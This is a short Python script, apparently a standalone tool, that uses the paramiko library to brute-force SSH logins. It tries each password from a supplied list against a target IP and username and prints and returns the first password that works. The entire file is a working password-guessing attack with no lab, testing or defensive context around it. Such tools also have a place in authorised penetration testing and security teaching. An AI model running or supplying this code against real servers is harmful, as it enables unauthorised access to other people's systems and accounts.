import paramiko 

def ssh_bruteforce(target_ip, username, password_list):
    """
    Attempt to brute-force SSH login on a target IP using a list of passwords.

    :param target_ip: The IP address of the target SSH server.
    :param username: The username to attempt to log in with.
    :param password_list: A list of passwords to try.
    :return: The successful password if found, otherwise None.
    """
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            ssh_client.connect(target_ip, username=username, password=password)
            print(f"Success! Password found: {password}")
            return password
        except paramiko.AuthenticationException:
            print(f"Failed login attempt with password: {password}")
        except Exception as e:
            print(f"An error occurred: {e}")

    print("Brute-force attack completed. No valid password found.")
    return None